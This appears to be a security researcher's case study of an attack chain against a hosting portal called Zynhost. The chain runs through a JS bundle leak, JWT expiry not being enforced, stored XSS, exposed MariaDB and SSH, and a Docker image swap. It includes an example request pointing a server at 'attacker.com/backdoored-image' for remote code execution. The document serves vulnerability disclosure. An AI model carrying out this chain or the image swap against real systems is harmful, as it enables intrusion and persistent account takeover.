# Full Infrastructure Compromise via Multiple Vulnerabilities
### Zynhost Portal Case Study — Attack Chain

---

## Attack Flow

```
┌─────────────────────────┐
│  JS Bundle Leak         │ ← Downloaded 34 JavaScript chunks
│  (Information Exposure) │    from Next.js application
└───────────┬─────────────┘
            ▼
┌─────────────────────────┐
│  API Enumeration        │ ← Extracted 100+ API endpoints
│  (Attack Surface Map)   │    from single JS file (26KB)
└───────────┬─────────────┘
            ▼
┌─────────────────────────┐
│  JWT Expiration Bypass  │ ← Token valid 2 days after exp
│  🔴 HIGH               │    Password change doesn't revoke
└───────────┬─────────────┘
            ▼
┌─────────────────────────┐
│  Token Persistence      │ ← Stolen token = permanent access
│  (No Revocation)        │    Logout doesn't invalidate
└───────────┬─────────────┘
            ▼
┌─────────────────────────┐
│  Stored XSS             │ ← Profile name accepts <script>
│  🔴 HIGH (in chain)     │    XSS + JWT bypass = steal forever
└───────────┬─────────────┘
            ▼
┌─────────────────────────┐
│  Infrastructure Leak    │ ← Docker registry URLs in API
│  (Config Disclosure)    │    Startup commands with env vars
└───────────┬─────────────┘
            ▼
┌─────────────────────────┐
│  Database Exposure      │ ← MariaDB 10.6.23 on port 3306
│  🔴 HIGH               │    LOAD DATA LOCAL = file read
└───────────┬─────────────┘
            ▼
┌─────────────────────────┐
│  SSH Access             │ ← Password auth enabled
│  🔴 HIGH               │    Same server as database
└───────────┬─────────────┘
            ▼
┌─────────────────────────┐
│  Docker Image Abuse     │ ← updateDockerImage API endpoint
│  (Potential RCE)        │    No whitelist = supply chain attack
└───────────┬─────────────┘
            ▼
┌─────────────────────────────────┐
│  FULL INFRASTRUCTURE COMPROMISE │
│  ═══════════════════════════════│
│  • Persistent account access    │
│  • Database read/write          │
│  • Server shell access          │
│  • Internal network pivot       │
│  • Container escape potential   │
└─────────────────────────────────┘
```

---

## Chain Details

### Stage 1: JS Bundle Leak → API Map

The Next.js application serves minified JavaScript bundles that contain the **complete API client**. A single file exposes:

- 100+ REST endpoints with HTTP methods and parameters
- Admin-only functionality (user management, payments, system settings)
- Third-party integrations (Pterodactyl, Virtualizor, VestaCP)
- Authentication flow and token handling logic

**No authentication required** — the JS files are publicly accessible.

### Stage 2: JWT Expiration Bypass → Permanent Access

The JWT implementation has a critical flaw — the backend does not validate the `exp` claim:

```
Token issued:  2026-03-09
Token expires: 2026-03-10
API call on:   2026-03-12 ← 2 days after expiration
Result:        200 OK ← should be 401
```

Additionally, logging in again does **not revoke** the previous token. This means a single stolen token grants **indefinite access**.

### Stage 3: XSS + JWT = Persistent Takeover

The profile name field accepts arbitrary HTML without sanitization:

```
PUT /api/user/profile {"name": "<script>...</script>"} → 200 OK
```

If this name is rendered without escaping (email templates, PDF invoices, admin SSR panels), the attacker steals the victim's JWT token. Because tokens **never expire and are never revoked**, this creates permanent unauthorized access that survives password changes.

### Stage 4: Infrastructure Discovery → Direct Access

The `/gameserver/configure-options` endpoint leaks internal infrastructure:

```json
{
  "docker_image": "docker.[redacted]:5000/java22",
  "startup": "java -Xms{{JVM_CUSTOM}}M ... {{SERVER_JARFILE}}"
}
```

Certificate Transparency (crt.sh) reveals `test1.[redacted]` with a real IP address, bypassing Cloudflare. Port scanning confirms:

| Port | Service | Risk |
|------|---------|------|
| 22 | SSH (password auth) | Brute force → shell |
| 3306 | MariaDB 10.6.23 | Brute force → data |
| 8080 | API (staging) | Same codebase as prod |

### Stage 5: Container Escape Potential

The `updateDockerImage` API endpoint allows changing the Docker image of a game server:

```
PUT /api/gameserver/{id}/docker-image
{"docker_image": "attacker.com/backdoored-image"}
```

If no whitelist is enforced, an attacker with a game server can replace the Docker image with a backdoored version, achieving **remote code execution** inside the hosting infrastructure.

---

## Severity Summary

| Stage | Finding | Severity | Status |
|-------|---------|----------|--------|
| 1 | JS Bundle API Exposure | 🟡 Medium | Confirmed |
| 2 | JWT No Expiration | 🔴 High | Confirmed |
| 3 | Stored XSS + Chain | 🔴 High | Confirmed |
| 4 | MariaDB Exposed | 🔴 High | Confirmed |
| 4 | SSH Password Auth | 🔴 High | Confirmed |
| 5 | Docker Image Swap | 🔴 Potential | Untested (requires paid server) |

---

📄 [Full Report →](report.md) · [Timeline →](timeline.md) · [Methodology →](methodology.md)
